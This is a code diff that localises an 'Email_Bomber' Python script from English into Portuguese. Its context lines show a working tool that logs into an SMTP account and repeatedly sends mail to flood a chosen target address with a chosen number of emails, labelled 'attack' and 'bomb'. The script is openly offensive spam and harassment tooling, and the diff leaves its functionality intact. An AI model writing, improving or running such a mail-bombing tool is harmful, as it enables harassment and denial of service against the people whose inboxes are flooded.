@@ -9,7 +9,7 @@ class bcolors:
 
 
 def banner():
-    print(bcolors.GREEN + '''Email-bomber''')
+    print(bcolors.GREEN + '''Bombadeiro de Email''')
 
 
 class Email_Bomber:
@@ -40,17 +40,17 @@ class Email_Bomber:
                 self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount <: '))
             print(bcolors.RED + f'\n+[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+')
         except Exception as e:
-            print(f'ERROR: {e}')
+            print(f'ERRO: {e}')
 
     def email(self):
         try:
-            print(bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+')
-            self.server = str(input(bcolors.GREEN + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
+            print(bcolors.RED + '\n+[+[+[ Configurando o email para o ataque ]+]+]+')
+            self.server = str(input(bcolors.GREEN + 'Servidor do email | ou Selecione uma dessas opções - 1:Gmail 2:Yahoo 3:Outlook <: '))
             premade = ['1', '2', '3']
             default_port = True
             if self.server not in premade:
                 default_port = False
-                self.port = int(input(bcolors.GREEN + 'Enter port number <: '))
+                self.port = int(input(bcolors.GREEN + 'Coloque o Número <: '))
 
             if default_port == True:
                 self.port = int(587)
@@ -76,22 +76,22 @@ class Email_Bomber:
             self.s.ehlo()
             self.s.login(self.fromAddr, self.fromPwd)
         except Exception as e:
-            print(f'ERROR: {e}')
+            print(f'ERRO: {e}')
 
     def send(self):
         try:
             self.s.sendmail(self.fromAddr, self.target, self.msg)
             self.count +=1
-            print(bcolors.YELLOW + f'BOMB: {self.count}')
+            print(bcolors.YELLOW + f'BOMBA: {self.count}')
         except Exception as e:
             print(f'ERROR: {e}')
 
     def attack(self):
-        print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
+        print(bcolors.RED + '\n+[+[+[ Atacando... ]+]+]+')
         for email in range(self.amount+1):
             self.send()
         self.s.close()
-        print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')
+        print(bcolors.RED + '\n+[+[+[ Ataque Concluido ]+]+]+')
         sys.exit(0)
 
 
